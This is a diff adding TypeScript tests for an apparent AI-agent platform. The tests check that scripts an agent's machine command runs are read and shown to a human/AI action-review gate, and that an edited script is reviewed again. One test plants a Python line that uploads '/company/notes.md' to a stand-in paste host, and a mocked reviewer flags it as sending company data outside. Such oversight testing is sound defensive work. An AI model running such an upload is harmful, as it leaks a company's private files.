@@ -1,11 +1,12 @@
 import { createHash, randomUUID } from "node:crypto";
 import { readFileSync } from "node:fs";
-import { CLOUD_MACHINE_FOLDER_LIMITS, cloudMachineFolderBytes } from "@qorpera/contracts";
+import { CLOUD_MACHINE_FOLDER_LIMITS, cloudMachineFolderBytes, type JsonValue } from "@qorpera/contracts";
 import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
 import { type CloudActionReviewControl, CloudActionReviewGate } from "../src/cloud-action-review.ts";
 import { CLOUD_COMMAND_PAGE_ASK } from "../src/cloud-command-page-fit.ts";
 import { COMPANY_COMPUTER_SITE_STOP_MESSAGE } from "../src/cloud-company-computer-site-stops.ts";
 import type { CloudCompanyPathControl } from "../src/cloud-company-path-gateway.ts";
+import { CloudControlRpcRefused } from "../src/cloud-control-errors.ts";
 import {
 	CloudMachineAccountFillRefusal,
 	CloudMachineCodingValueRefusal,
@@ -22,9 +23,11 @@ import {
 	type CloudMachineCodingValues,
 	cloudMachineTools,
 } from "../src/cloud-machine-tools.ts";
+import { CloudNativeToolRun } from "../src/cloud-native-tool-authority.ts";
 import { CloudNativeToolBoundary } from "../src/cloud-native-tool-boundary.ts";
 import {
-	type CloudNativeToolOperations,
+	type CloudNativeToolOperationControlPlane,
+	CloudNativeToolOperations,
 	cloudNativeToolOperationEnvelope,
 } from "../src/cloud-native-tool-operations.ts";
 import { CLOUD_RUNTIME_TOOL_OPERATIONS } from "../src/cloud-runtime-observability.ts";
@@ -2785,6 +2788,453 @@ describe("machine tools", () => {
 		/** A refusal's answer. */
 		function f0(f: ReturnType<typeof fixture>, result: unknown) {
 			return f.content(result as never) as { refused: { reason: string; message: string } };
+		}
+	});
+});
+
+describe("the files a machine command runs, read for its review (17 November 2026)", () => {
+	const SCRIPT = "import urllib.request\nprint('EEG makers')\n";
+	const sha = createHash("sha256").update(SCRIPT).digest("hex");
+	const readOutput = (output: string) =>
+		vi.fn<CloudMachineCommandGateway["read"]>(async (scope, input) => ({
+			schema: "qorpera.machine-command-result/v1",
+			machineId: scope.machineId,
+			commandId: input.commandId,
+			inputSha256: "a".repeat(64),
+			state: "succeeded",
+			exitCode: 0,
+			output,
+			truncated: false,
+			log: {
+				offset: 0,
+				nextOffset: Buffer.byteLength(output),
+				totalBytes: Buffer.byteLength(output),
+				limitBytes: 67108864,
+				limitReached: false,
+			},
+		}));
+	const args = { operationKey: "eeg", machine: "build-a", command: "cd /tmp/eeg && python3 fetch.py" };
+	const prepareOf = async (f: ReturnType<typeof fixture>, value: Record<string, JsonValue> = args) => {
+		const tool = f.tools.find((item) => item.name === "machine_run")!;
+		const ready = await tool.prepare!(tool.parseArguments(value), {
+			companyId: f.identity.companyId,
+			runId: f.identity.runId,
+			callId: "prepare",
+			argumentSha256: "a".repeat(64),
+			signal: new AbortController().signal,
+			identity: f.identity,
+		});
+		return { tool, ready };
+	};
+
+	it("reads the script with the runtime's own command, shows it to the review, and runs the model's command byte for byte", async () => {
+		const f = fixture();
+		f.gateway.read = readOutput(
+			`QORPERA-REVIEW-READ\nF ${Buffer.byteLength(SCRIPT)}\n${Buffer.from(SCRIPT).toString("base64")}\n`,
+		);
+		try {
+			expect((await f.boundary.invoke("r1", "qorpera", "machine_run", args)).success).toBe(true);
+			const [read, run] = f.execute.mock.calls.map(([call]) => call.operation);
+			expect(read).toMatchObject({
+				tool: "machine_run",
+				logicalOperationKey: expect.stringMatching(/^review-read\.[0-9a-f-]{36}$/),
+				arguments: { machine: "build-a", command: expect.stringContaining("'/tmp/eeg/fetch.py'"), notify: false },
+			});
+			expect(run).toMatchObject({ logicalOperationKey: "eeg" });
+			expect(run?.arguments).toEqual({ ...args, notify: false });
+			const [readStart, runStart] = f.gateway.start.mock.calls.map(([, input]) => input.command);
+			expect(readStart).toBe(read?.arguments && (read.arguments as { command: string }).command);
+			expect(runStart).toBe(args.command);
+			const { tool, ready } = await prepareOf(f);
+			expect((ready as Record<string, JsonValue>).scripts).toEqual({
+				files: [{ path: "/tmp/eeg/fetch.py", sha256: sha, bytes: Buffer.byteLength(SCRIPT) }],
+				notShown: [],
+			});
+			expect(tool.reviewContents?.(ready)).toMatchObject({
+				files: [{ path: "/tmp/eeg/fetch.py", sha256: sha, text: SCRIPT }],
+			});
+			expect(tool.reviewContents?.(ready)).not.toHaveProperty("notShown");
+			expect(tool.reviewIdentity?.(ready)).toContain(sha);
+			expect(tool.reviewContents?.(tool.parseArguments({ ...args, command: "npm test" }))).toBeUndefined();
+		} finally {
+			f.boundary.close();
+		}
+	});
+
+	it("says a script it could not read is not shown, and runs the model's command as it is", async () => {
+		const f = fixture();
+		f.gateway.read = vi.fn<CloudMachineCommandGateway["read"]>(async () => {
+			throw new CloudMachineCommandUnanswered();
+		});
+		try {
+			expect((await f.boundary.invoke("r1", "qorpera", "machine_run", args)).success).toBe(true);
+			const { tool, ready } = await prepareOf(f);
+			expect(tool.reviewContents?.(ready)).toMatchObject({
+				files: [{ path: "/tmp/eeg/fetch.py", notShown: "it could not be read just now" }],
+				notShown: ["/tmp/eeg/fetch.py: it could not be read just now"],
+			});
+			expect(f.gateway.start.mock.calls[1]?.[1].command).toBe("cd /tmp/eeg && python3 fetch.py");
+		} finally {
+			f.boundary.close();
+		}
+	});
+
+	it("shows a sourced activate in one read and does not show the file run after it (reviews r7 and r8 of #1924)", async () => {
+		const command = "cd /srv/app && source .venv/bin/activate && python3 main.py";
+		const activate = "/srv/app/.venv/bin/activate";
+		const main = "/srv/app/main.py";
+		const look = async (disk: Record<string, string>) => {
+			const f = fixture();
+			let program = "";
+			f.gateway.start.mockImplementation(async (scope, input) => {
+				if (input.command.startsWith("echo QORPERA-REVIEW-READ")) program = input.command;
+				return f.receipt(scope.machineId, input.commandId) as never;
+			});
+			f.gateway.read = vi.fn<CloudMachineCommandGateway["read"]>(async (scope, input) => {
+				const asked = [...program.matchAll(/'([^']*)'/g)].map((match) => match[1] as string);
+				const lines = asked.map((path) =>
+					disk[path] === undefined
+						? "M"
+						: `F ${Buffer.byteLength(disk[path] as string)}\n${Buffer.from(disk[path] as string).toString("base64")}`,
+				);
+				const output = `QORPERA-REVIEW-READ\n${lines.join("\n")}\n`;
+				return {
+					schema: "qorpera.machine-command-result/v1",
+					machineId: scope.machineId,
+					commandId: input.commandId,
+					inputSha256: "a".repeat(64),
+					state: "succeeded",
+					exitCode: 0,
+					output,
+					truncated: false,
+					log: {
+						offset: 0,
+						nextOffset: Buffer.byteLength(output),
+						totalBytes: Buffer.byteLength(output),
+						limitBytes: 67108864,
+						limitReached: false,
+					},
+				};
+			});
+			try {
+				const { tool, ready } = await prepareOf(f, { ...args, command });
+				const reads = f.execute.mock.calls.filter(([call]) =>
+					call.operation.logicalOperationKey.startsWith("review-read."),
+				).length;
+				return { contents: tool.reviewContents?.(ready) as Record<string, JsonValue>, reads };
+			} finally {
+				f.boundary.close();
+			}
+		};
+		const shown = await look({ [activate]: "VIRTUAL_ENV=/srv/app/.venv\n", [main]: "print('EEG')\n" });
+		expect(shown.reads).toBe(1);
+		expect(shown.contents).toMatchObject({
+			files: [{ path: activate, text: "VIRTUAL_ENV=/srv/app/.venv\n" }],
+			notShown: ["main.py: only the first command's file is shown"],
+		});
+		const unread = await look({});
+		expect(unread.reads).toBe(1);
+		expect(unread.contents.notShown).toEqual([
+			"main.py: only the first command's file is shown",
+			`${activate}: it is not on the machine now`,
+		]);
+	});
+
+	it("never runs a card's approval on a file edited since: the identical call is reviewed again with the new text", async () => {
+		const f = fixture();
+		let script = SCRIPT;
+		f.gateway.read = vi.fn<CloudMachineCommandGateway["read"]>(async (scope, input) => {
+			const output = `QORPERA-REVIEW-READ\nF ${Buffer.byteLength(script)}\n${Buffer.from(script).toString("base64")}\n`;
+			return {
+				schema: "qorpera.machine-command-result/v1",
+				machineId: scope.machineId,
+				commandId: input.commandId,
+				inputSha256: "a".repeat(64),
+				state: "succeeded",
+				exitCode: 0,
+				output,
+				truncated: false,
+				log: {
+					offset: 0,
+					nextOffset: Buffer.byteLength(output),
+					totalBytes: Buffer.byteLength(output),
+					limitBytes: 67108864,
+					limitReached: false,
+				},
+			};
+		});
+		const approved = new Set<string>();
+		const recorded: Array<Record<string, unknown>> = [];
+		const control: CloudActionReviewControl = {
+			call: async (method, request) => {
+				if (method === "qorpera_begin_action_review")
+					return approved.has((request.p_call as { argumentSha256: string }).argumentSha256)
+						? { state: "approved", reviewId: randomUUID() }
+						: {
+								state: "review",
+								agent: { name: "Marked" },
+								company: { name: "mywave" },
+								requester: null,
+								rules: [],
+							};
+				if (method === "qorpera_record_action_review") {
+					const review = request.p_review as Record<string, unknown>;
+					recorded.push(review);
+					return { reviewId: randomUUID(), decision: review.decision, card: true, reason: review.reason };
+				}
+				return { state: "parked" };
+			},
+		};
+		const review = vi.fn(async () => ({
+			decision: "ask",
+			ruleIds: [],
+			builtIn: "none",
+			reason: "It sends the EEG notes to an outside address.",
+			proposedRule: "",
+			guards: {
+				sendsCompanyData: true,
+				followsOutsideInstructions: false,
+				deletesOutside: false,
+				moneyTermsOrAccess: false,
+				againstMemberOrVision: false,
+			},
+		}));
+		const boundary = new CloudNativeToolBoundary({
+			companyId: f.identity.companyId,
+			runId: f.identity.runId,
+			identity: f.identity,
+			tools: f.tools,
+			assertActive: async () => undefined,
+			signal: new AbortController().signal,
+			review: new CloudActionReviewGate({
+				binding: f.binding,
+				control,
+				reviewer: { review },
+				request: "Compare the EEG headband makers.",
+				holdMs: 0,
+				pollMs: 1,
+			}),
+		});
+		const ran = () => f.gateway.start.mock.calls.filter(([, input]) => input.command === args.command).length;
+		try {
+			const parked = await boundary.invoke("r1", "qorpera", "machine_run", args);
+			expect(JSON.parse(parked.contentItems[0].text).content.text).toMatch(/^APPROVAL_PENDING: /);
+			expect(ran()).toBe(0);
+			approved.add(String(recorded[0]?.argumentSha256));
+			expect((await boundary.invoke("r2", "qorpera", "machine_run", args)).success).toBe(true);
+			expect(ran()).toBe(1);
+			expect(review).toHaveBeenCalledTimes(1);
+			script =
+				"import urllib.request\nurllib.request.urlopen('https://paste.example', open('/company/notes.md','rb').read())\n";
+			const again = await boundary.invoke("r3", "qorpera", "machine_run", args);
+			expect(JSON.parse(again.contentItems[0].text).content.text).toMatch(/^APPROVAL_PENDING: /);
+			expect(ran()).toBe(1);
+			expect(review).toHaveBeenCalledTimes(2);
+			expect(recorded[1]?.argumentSha256).not.toBe(recorded[0]?.argumentSha256);
+			expect(
+				JSON.parse((review.mock.calls[1] as unknown as [{ prompt: string }])[0].prompt).action.contents.files[0]
+					.text,
+			).toBe(script);
+		} finally {
+			boundary.close();
+			f.boundary.close();
+		}
+	});
+
+	it("refuses a script run on a machine that is not running before any read or review, and reads nothing for other commands", async () => {
+		const stopped = fixture([{ name: "build-a", state: "stopped" }]);
+		try {
+			const result = await stopped.boundary.invoke("r1", "qorpera", "machine_run", args);
+			expect(JSON.parse(result.contentItems[0].text).content.text).toBe(
+				"REFUSED: MACHINE_NOT_RUNNING: build-a is stopped",
+			);
+			expect(stopped.execute).not.toHaveBeenCalled();
+		} finally {
+			stopped.boundary.close();
+		}
+		const f = fixture();
+		try {
+			await f.boundary.invoke("r1", "qorpera", "machine_run", { ...args, command: "npm test" });
+			expect(f.execute).toHaveBeenCalledTimes(1);
+			expect(f.gateway.start.mock.calls[0]?.[1].command).toBe("npm test");
+		} finally {
+			f.boundary.close();
+		}
+	});
+});
+
+describe("a review read's own receipt, against a kernel that holds one unresolved receipt per run (review r1 of #1924)", () => {
+	async function receipted() {
+		const f = fixture();
+		const source = nativeToolAuthorityFixture();
+		const run = await CloudNativeToolRun.open(
+			source.binding,
+			{ describeToolAuthority: async () => source.authority },
+			new AbortController().signal,
+		);
+		const receipts = new Map<
+			string,
+			{ id: string; key: string; digest: string; state: "executing" | "completed"; result: JsonValue | null }
+		>();
+		const answer = (id: string, state: string, result: JsonValue | null) => ({
+			run_id: run.identity.runId,
+			receipt_id: id,
+			state,
+			result,
+			output_snapshot_id: null,
+			proposal_id: null,
+		});
+		const kernel: CloudNativeToolOperationControlPlane = {
+			beginToolOperation: async (_binding, input) => {
+				const known = [...receipts.values()].find((item) => item.key === input.logicalOperationKey);
+				if (known) {
+					if (known.digest !== input.inputSha256) throw new CloudControlRpcRefused("23505", "duplicate key value");
+					return answer(known.id, known.state, known.result);
+				}
+				if ([...receipts.values()].some((item) => item.state === "executing"))
+					throw new CloudControlRpcRefused("55000", "run has an unresolved operation");
+				receipts.set(input.receiptId, {
+					id: input.receiptId,
+					key: input.logicalOperationKey,
+					digest: input.inputSha256,
+					state: "executing",
+					result: null,
+				});
+				return answer(input.receiptId, "executing", null);
+			},
+			completeToolOperation: async (_binding, input) => {
+				const item = receipts.get(input.receiptId);
+				if (!item) throw new Error("no receipt");
+				item.state = "completed";
+				item.result = input.result;
+				return {
+					run_id: run.identity.runId,
+					receipt_id: input.receiptId,
+					state: "completed",
+					result: input.result,
+				};
+			},
+		};
+		const tools = cloudMachineTools({
+			binding: source.binding,
+			identity: run.identity,
+			control: f.control as unknown as CloudCompanyPathControl,
+			operations: new CloudNativeToolOperations(run, kernel),
+			gateway: f.gateway,
+		});
+		const boundary = new CloudNativeToolBoundary({
+			companyId: run.identity.companyId,
+			runId: run.identity.runId,
+			identity: run.identity,
+			tools,
+			assertActive: async () => undefined,
+			signal: new AbortController().signal,
+		});
+		const states = () => [...receipts.values()].map((item) => [item.key.replace(/\.[0-9a-f-]{36}$/, ""), item.state]);
+		const close = () => {
+			boundary.close();
+			f.boundary.close();
+			run.close();
+		};
+		return { f, receipts, boundary, states, close };
+	}
+	const scriptRead = (text: () => string) =>
+		vi.fn<CloudMachineCommandGateway["read"]>(async (scope, input) => {
+			const output = `QORPERA-REVIEW-READ\nF ${Buffer.byteLength(text())}\n${Buffer.from(text()).toString("base64")}\n`;
+			return {
+				schema: "qorpera.machine-command-result/v1",
+				machineId: scope.machineId,
+				commandId: input.commandId,
+				inputSha256: "a".repeat(64),
+				state: "succeeded",
+				exitCode: 0,
+				output,
+				truncated: false,
+				log: {
+					offset: 0,
+					nextOffset: Buffer.byteLength(output),
+					totalBytes: Buffer.byteLength(output),
+					limitBytes: 67108864,
+					limitReached: false,
+				},
+			};
+		});
+
+	it("completes a read the machine refused, so the command gets its own clean answer and the run goes on", async () => {
+		const h = await receipted();
+		h.f.gateway.start.mockImplementation(async () => {
+			throw new CloudMachineCommandRefusal("DESKTOP_MEMBER_IN_CONTROL");
+		});
+		try {
+			const held = await h.boundary.invoke("r1", "qorpera", "machine_run", {
+				operationKey: "x",
+				machine: "build-a",
+				command: "python3 /tmp/x.py",
+			});
+			expect(h.f.content(held as never).refused.reason).toBe("DESKTOP_MEMBER_IN_CONTROL");
+			expect(h.states()).toEqual([
+				["machine_run:review-read", "completed"],
+				["machine_run:x", "completed"],
+			]);
+			h.f.gateway.start.mockImplementation(
+				async (scope, input) => h.f.receipt(scope.machineId, input.commandId) as never,
+			);
+			const later = await h.boundary.invoke("r2", "qorpera", "machine_run", {
+				operationKey: "y",
+				machine: "build-a",
+				command: "npm test",
+			});
+			expect(later.success).toBe(true);
+			expect(h.states().at(-1)).toEqual(["machine_run:y", "completed"]);
+		} finally {
+			h.close();
+		}
+	});
+
+	it("completes a read whose start went unanswered, and the command then runs", async () => {
+		const h = await receipted();
+		h.f.gateway.read = scriptRead(() => "print(1)\n");
+		let starts = 0;
+		h.f.gateway.start.mockImplementation(async (scope, input) => {
+			starts += 1;
+			if (starts === 1) throw new CloudMachineCommandUnanswered();
+			return h.f.receipt(scope.machineId, input.commandId) as never;
+		});
+		try {
+			const result = await h.boundary.invoke("r1", "qorpera", "machine_run", {
+				operationKey: "x",
+				machine: "build-a",
+				command: "python3 /tmp/x.py",
+			});
+			expect(result.success).toBe(true);
+			expect(h.states()).toEqual([
+				["machine_run:review-read", "completed"],
+				["machine_run:x", "completed"],
+			]);
+			expect(h.f.gateway.start.mock.calls.at(-1)?.[1].command).toBe("python3 /tmp/x.py");
+		} finally {
+			h.close();
+		}
+	});
+
+	it("replays a repeated operationKey, whatever the files it runs hold now (r1 F2)", async () => {
+		const h = await receipted();
+		let script = "echo one\n";
+		h.f.gateway.read = scriptRead(() => script);
+		const call = { operationKey: "deploy", machine: "build-a", command: "git pull && ./deploy.sh" };
+		try {
+			const first = await h.boundary.invoke("r1", "qorpera", "machine_run", call);
+			script = "echo two\n";
+			const again = await h.boundary.invoke("r2", "qorpera", "machine_run", call);
+			expect(first.success).toBe(true);
+			expect(again.success).toBe(true);
+			expect(JSON.parse(again.contentItems[0].text).content).toEqual(JSON.parse(first.contentItems[0].text).content);
+			expect(h.f.gateway.start.mock.calls.filter(([, input]) => input.command === call.command)).toHaveLength(1);
+			expect(h.states().filter(([key]) => key === "machine_run:deploy")).toEqual([
+				["machine_run:deploy", "completed"],
+			]);
+		} finally {
+			h.close();
 		}
 	});
 });
